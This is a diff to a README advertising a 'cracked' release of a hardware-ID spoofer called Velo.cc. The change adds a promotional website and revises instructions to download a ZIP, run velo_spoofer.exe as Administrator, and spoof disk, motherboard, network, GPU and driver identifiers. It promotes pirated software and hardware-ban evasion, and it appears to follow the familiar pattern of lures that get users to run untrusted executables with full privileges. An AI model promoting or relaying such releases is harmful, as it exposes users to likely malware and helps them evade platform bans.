@@ -1,5 +1,5 @@
 # Velo.cc-Cracked-SPOOFER-2026-
-Release of a cracked version
+Release of a cracked version , CHECK THE WEBSITE FOR MORE INFORMATION : velohwid.com
 
 # For Regular Users
 
@@ -9,9 +9,9 @@ Download and extract the ZIP (no password)
 
 Run velo_spoofer.exe as Administrator
 
-Select the identifiers you want to change (Disk, Baseboard, MAC, GPU, etc.)
+Select the identifiers you want to change (Disk,MB,Ethernet , GPU, DRIVER/PERF SPOOF.)
 
-Click Apply Changes and wait for the spoofing process to complete
+After applying changes, wait for the spoofing process to complete.
 
 Restart your PC to apply the new hardware serial numbers
 
